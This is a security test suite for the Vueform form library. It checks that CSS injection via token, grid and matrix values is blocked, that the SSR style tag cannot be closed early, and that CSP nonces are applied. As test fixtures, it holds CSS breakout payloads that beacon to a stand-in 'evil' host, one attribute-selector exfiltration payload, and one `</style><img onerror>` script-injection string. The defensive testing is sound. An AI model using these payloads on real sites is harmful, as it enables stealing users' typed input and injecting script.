/**
 * # CSS injection containment
 *
 * Threat model: several schema-reachable values are interpolated into the text
 * of rendered `<style>` tags — per-instance token overrides (the `tokens`
 * prop), grid column widths, and the matrix's `grid-template-columns`. A value
 * like `red}[data-secret]{background:url(…)` would close the scoped rule and
 * inject arbitrary selectors, enabling attribute-selector exfiltration of typed
 * input values. The guarantees: declarations that could break out of their rule
 * are dropped (never rendered), the SSR style-tag string cannot be closed early
 * by CSS content, and every injected `<style>` tag carries the configured CSP
 * nonce.
 */
import {
  createVueform,
  defineSchema,
  model,
  security,
  theme,
} from '@vueform/core'
import { nextTick } from 'vue'
import { createForm } from '../../helpers'

describe('Security: CSS injection containment', () => {
  describe('token declarations', () => {
    /**
     * Threat: a schema `tokens` value containing `}` breaking out of the
     * per-instance scoped rule.
     *
     * Measure: token values carrying `{`/`}` are dropped with a dev warning
     * before the CSS string is built.
     *
     * Verified red→green: the breakout selector reached the style text before
     * the fix.
     */
    test('it should drop token values containing braces', async () => {
      const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})

      const { form } = createForm({
        schema: defineSchema({
          el: {
            type: 'text',
            label: 'Foo',
            tokens: {
              primary: 'red}body{background:url(//evil/x)',
            } as any,
          },
        }),
      })

      await nextTick()

      expect(form.html()).not.toContain('evil')
      expect(warn).toHaveBeenCalledWith(
        expect.stringContaining('must not contain `{` or `}`')
      )

      warn.mockRestore()
    })

    /**
     * Threat: a hostile token KEY — `normalizeThemeKey` does not constrain
     * characters, so a key like `x;}body{…` would survive into the declaration
     * position.
     *
     * Measure: normalized keys must match plain `--vf-*` names or the
     * declaration is dropped.
     */
    test('it should drop token keys that do not normalize to plain names', async () => {
      const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})

      const { form } = createForm({
        schema: defineSchema({
          el: {
            type: 'text',
            label: 'Foo',
            tokens: {
              'x:red;}body{background:url(//evil/x);}': 'red',
            } as any,
          },
        }),
      })

      await nextTick()

      expect(form.html()).not.toContain('evil')
      expect(warn).toHaveBeenCalledWith(expect.stringContaining('was dropped'))

      warn.mockRestore()
    })

    /**
     * Threat: over-blocking — legitimate token overrides (including the shipped
     * data-URI icon values, which are percent-encoded and brace-free) must keep
     * working.
     *
     * Measure: ordinary values pass through into the scoped style rule.
     */
    test('it should keep legitimate token values', async () => {
      const { form } = createForm({
        schema: defineSchema({
          el: {
            type: 'text',
            label: 'Foo',
            tokens: { primary: 'rgb(1, 2, 3)' } as any,
          },
        }),
      })

      await nextTick()

      const css = form
        .findAll('style')
        .map((s) => s.text())
        .join('\n')
      expect(css).toContain('--vf-primary:rgb(1, 2, 3)')
    })
  })

  describe('grid and matrix layout values', () => {
    /**
     * Threat: grid `widths` strings breaking out of the grid's scoped rule.
     *
     * Measure: brace-carrying width values are dropped (the column falls back
     * to its default sizing).
     */
    test('it should drop grid width values containing braces', async () => {
      const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})

      const { form } = createForm({
        schema: defineSchema({
          g: {
            type: 'grid',
            cols: 1,
            widths: ['1fr}body{background:url(//evil/x)'],
            grid: [['cell']],
          } as any,
        }),
      })

      await nextTick()

      expect(form.html()).not.toContain('evil')
      expect(warn).toHaveBeenCalledWith(
        expect.stringContaining('must not contain `{` or `}`')
      )

      warn.mockRestore()
    })

    /**
     * Threat: the matrix's `gridTemplateColumns` prop (string or function
     * result) — the same breakout through a different blueprint.
     *
     * Measure: the resolved template string is validated before interpolation.
     */
    test('it should drop matrix gridTemplateColumns containing braces', async () => {
      const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})

      const { form } = createForm({
        schema: defineSchema({
          m: {
            type: 'matrix',
            cols: [{ value: 'a', label: 'A' }],
            rows: 1,
            inputType: 'radio',
            gridTemplateColumns: '1fr}body{background:url(//evil/x)',
          } as any,
        }),
      })

      await nextTick()

      expect(form.html()).not.toContain('evil')

      warn.mockRestore()
    })
  })

  describe('style tags carry the CSP nonce', () => {
    /**
     * Threat: not an attack but a deployment guarantee — under a strict
     * `style-src-elem` policy, any Vueform style tag missing the nonce is
     * silently dropped by the browser and the form renders unstyled.
     *
     * Measure: per-instance `<style>` tags rendered by components carry the
     * configured `nonce` attribute (pre-existing guarantee, proven here).
     */
    test('it should render per-instance style tags with the configured nonce', async () => {
      const { form } = createForm(
        {
          schema: defineSchema({
            el: {
              type: 'text',
              label: 'Foo',
              tokens: { primary: 'red' } as any,
            },
          }),
        },
        { nonce: 'test-nonce-123' } as any
      )

      await nextTick()

      const style = form.find('style')
      expect(style.exists()).toBe(true)
      expect(style.attributes('nonce')).toBe('test-nonce-123')
    })
  })

  describe('the global theme stylesheet', () => {
    /**
     * Threat: none — the module boundary. CSS containment is the security
     * module's `sanitizeCss` capability: without the module, token values reach
     * the stylesheet as written (the deliberate wholesale opt-out).
     */
    test('it should leave CSS values unchecked without the module', () => {
      const vueform = createVueform({
        modules: { model, theme },
        tokens: { probe: 'red } * { background: blue ' },
      } as any)

      expect(vueform.getStyleTag()).toContain('background: blue')
    })

    /**
     * Threat: a global `tokens` config value carrying `{`/`}` — the theme
     * stylesheet interpolates declarations verbatim, so a brace could close the
     * `:root` rule and open an attacker-chosen selector (e.g. attribute
     * selectors exfiltrating typed input values). This path is developer-config
     * trust, but the validation applies to every site that builds CSS text, so
     * the guarantee has no asymmetric gap.
     *
     * Measure: the same key/value validation as element-level tokens
     * (`isSafeThemeDecl`) — brace-bearing declarations are dropped with a dev
     * warning.
     *
     * Verified red→green: the breakout selector reached the stylesheet before
     * the fix.
     */
    test('it should drop brace-bearing global token values from the theme stylesheet', () => {
      const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})

      const vueform = createVueform({
        modules: { model, security, theme },
        tokens: {
          primary: 'red',
          evil: 'blue } input[value^="a"] { background: url(//evil/?a) ',
        },
      } as any)

      const tag = vueform.getStyleTag()

      expect(tag).toContain('--vf-primary')
      expect(tag).not.toContain('evil')
      expect(tag).not.toContain('input[value')
      expect(warn).toHaveBeenCalledWith(
        expect.stringContaining('`evil` was dropped')
      )

      warn.mockRestore()
    })

    /**
     * Threat: the SSR path. `getStyleTag()` returns a raw HTML string the
     * server splices into the document — a `</style>` sequence inside the CSS
     * (e.g. from a token value) would close the element early and everything
     * after it would parse as markup.
     *
     * Measure: `</` is escaped to `<\/` in the returned CSS text (a valid CSS
     * string escape), so the only `</` in the output is the closing tag
     * itself.
     */
    test('it should not allow CSS to close the SSR style tag early', () => {
      const vueform = createVueform({
        modules: { model, security, theme },
        nonce: 'ssr-nonce-1',
        tokens: {
          probe: 'url("a</style><img src=x onerror=alert(1)>")',
        },
      } as any)

      const tag = vueform.getStyleTag()

      expect(tag.startsWith('<style')).toBe(true)
      expect(tag.endsWith('</style>')).toBe(true)

      // Everything between the opening tag and the final closing tag must be
      // free of `</` — the escape leaves `<\/` instead.
      const inner = tag.slice(tag.indexOf('>') + 1, tag.lastIndexOf('</style>'))
      expect(inner).not.toContain('</')
      expect(inner).toContain('probe')
    })

    /**
     * Threat: a deployment guarantee, not an attack — under strict
     * `style-src-elem`, a theme tag missing the nonce is dropped by the browser
     * and the form renders unstyled, pushing apps to weaken CSP.
     *
     * Measure: the nonce reaches all three injection paths. Path 1 — the SSR
     * string carries it as an attribute.
     */
    test('it should include the nonce in the SSR style tag', () => {
      const vueform = createVueform({
        modules: { model, security, theme },
        nonce: 'ssr-nonce-2',
        tokens: { primary: 'red' },
      } as any)

      expect(vueform.getStyleTag()).toContain('nonce="ssr-nonce-2"')
    })

    /**
     * Measure continued: path 2 — with no Unhead present, the module falls back
     * to inserting a `<style>` element into `document.head` and sets the nonce
     * via `setAttribute`.
     */
    test('it should set the nonce on the DOM-injected theme tag', async () => {
      createForm(
        {
          schema: defineSchema({ name: { type: 'text' } }),
        },
        {
          nonce: 'dom-nonce-3',
          tokens: { primary: 'red' },
          build: { styleId: 'vf-freeze-probe-dom' },
        } as any
      )

      const tag = document.getElementById('vf-freeze-probe-dom')
      expect(tag).not.toBeNull()
      expect(tag!.getAttribute('nonce')).toBe('dom-nonce-3')
      expect(tag!.textContent).toContain('--vf-primary')
    })

    /**
     * Measure continued: path 3 — when Unhead is installed (Nuxt), the CSS is
     * handed to `head.push()` with the nonce in the style entry instead of
     * touching the DOM.
     */
    test('it should pass the nonce to Unhead when present', async () => {
      const push = vi.fn()

      createForm(
        {
          schema: defineSchema({ name: { type: 'text' } }),
        },
        {
          nonce: 'head-nonce-4',
          tokens: { primary: 'red' },
          build: { styleId: 'vf-probe-unhead' },
        } as any,
        {
          global: {
            provide: { usehead: { push } },
          },
        }
      )

      expect(push).toHaveBeenCalledWith(
        expect.objectContaining({
          style: [
            expect.objectContaining({
              id: 'vf-probe-unhead',
              nonce: 'head-nonce-4',
            }),
          ],
        })
      )
      expect(document.getElementById('vf-probe-unhead')).toBeNull()
    })
  })
})
